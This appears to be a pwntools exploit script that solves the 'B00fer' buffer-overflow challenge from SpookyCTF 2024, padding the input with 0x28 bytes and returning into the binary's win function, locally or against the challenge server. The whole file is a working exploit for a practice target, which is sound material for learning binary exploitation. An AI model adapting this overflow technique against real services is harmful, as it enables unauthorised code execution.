#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/SpookyCTF 2024/pwn/B00fer/B00fer')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    rop = ROP(elf)

    rop.raw(cyclic(0x28))
    rop.win()

    r.sendlineafter(b'\n', rop.chain())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('b00fer.niccgetsspooky.xyz', 9001)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
